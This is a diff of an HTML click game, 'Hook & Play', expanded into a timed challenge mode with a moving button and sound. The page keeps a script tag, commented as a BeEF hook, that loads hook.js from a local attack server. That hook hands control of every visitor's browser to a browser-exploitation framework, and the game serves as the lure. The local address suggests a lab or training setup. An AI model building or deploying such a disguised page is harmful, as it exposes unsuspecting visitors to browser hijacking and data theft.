@@ -1,60 +1,127 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Hook & Play</title>
-  <style>
-    body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: #121212;
-      color: #e0e0e0;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      margin: 0;
-    }
-    h1 {
-      margin-bottom: 20px;
-    }
-    #score {
-      font-size: 2rem;
-      margin: 15px 0;
-    }
-    button {
-      padding: 15px 30px;
-      font-size: 1.2rem;
-      border: none;
-      border-radius: 8px;
-      background: #0078d7;
-      color: white;
-      cursor: pointer;
-      transition: background 0.3s;
-    }
-    button:hover {
-      background: #005ea1;
-    }
-  </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Hook & Play — Challenge Mode</title>
+<style>
+  body {
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    background: #121212;
+    color: #e0e0e0;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    height: 100vh;
+    margin: 0;
+    overflow: hidden;
+  }
+  h1 {
+    margin-bottom: 10px;
+  }
+  #score, #timer {
+    font-size: 1.5rem;
+    margin: 5px 0;
+  }
+  button {
+    position: absolute;
+    padding: 10px 20px;
+    font-size: 1rem;
+    border: none;
+    border-radius: 8px;
+    background: #0078d7;
+    color: white;
+    cursor: pointer;
+    transition: background 0.3s, transform 0.2s;
+  }
+  button:hover {
+    background: #005ea1;
+    transform: scale(1.1);
+  }
+  #startButton {
+    position: static;
+    margin-top: 20px;
+    padding: 15px 30px;
+    font-size: 1.2rem;
+  }
+</style>
 </head>
 <body>
   <h1>Catch the Points!</h1>
   <div id="score">Score: 0</div>
-  <button id="gameButton">Click me!</button>
+  <div id="timer">Time: 30</div>
+  <button id="gameButton" style="display:none;">Click me!</button>
+  <button id="startButton">Start Game</button>
 
   <!-- BeEF Hook -->
   <script src="http://127.0.0.1:3000/hook.js"></script>
 
-  <script>
-    let score = 0;
-    const scoreDisplay = document.getElementById('score');
-    const button = document.getElementById('gameButton');
+<script>
+const gameButton = document.getElementById('gameButton');
+const startButton = document.getElementById('startButton');
+const scoreDisplay = document.getElementById('score');
+const timerDisplay = document.getElementById('timer');
+let score = 0;
+let timeLeft = 30;
+let timer;
 
-    button.addEventListener('click', () => {
-      score++;
-      scoreDisplay.textContent = `Score: ${score}`;
-    });
-  </script>
+startButton.addEventListener('click', () => {
+  startButton.style.display = 'none';
+  gameButton.style.display = 'block';
+  score = 0;
+  timeLeft = 30;
+  updateScore();
+  updateTimer();
+  moveButton();
+  timer = setInterval(() => {
+    timeLeft--;
+    updateTimer();
+    if (timeLeft <= 0) endGame();
+  }, 1000);
+});
+
+gameButton.addEventListener('click', () => {
+  score++;
+  updateScore();
+  moveButton();
+  playSound();
+});
+
+function updateScore() {
+  scoreDisplay.textContent = `Score: ${score}`;
+}
+
+function updateTimer() {
+  timerDisplay.textContent = `Time: ${timeLeft}`;
+}
+
+function moveButton() {
+  const x = Math.random() * (window.innerWidth - gameButton.offsetWidth);
+  const y = Math.random() * (window.innerHeight - gameButton.offsetHeight);
+  gameButton.style.left = `${x}px`;
+  gameButton.style.top = `${y}px`;
+}
+
+function endGame() {
+  clearInterval(timer);
+  gameButton.style.display = 'none';
+  startButton.style.display = 'block';
+  alert(`Time's up! Your score: ${score}`);
+}
+
+function playSound() {
+  const ctx = new (window.AudioContext || window.webkitAudioContext)();
+  const osc = ctx.createOscillator();
+  const gain = ctx.createGain();
+  osc.type = 'square';
+  osc.frequency.value = 600;
+  osc.connect(gain);
+  gain.connect(ctx.destination);
+  osc.start();
+  gain.gain.setValueAtTime(0.1, ctx.currentTime);
+  osc.stop(ctx.currentTime + 0.1);
+}
+</script>
 </body>
 </html>
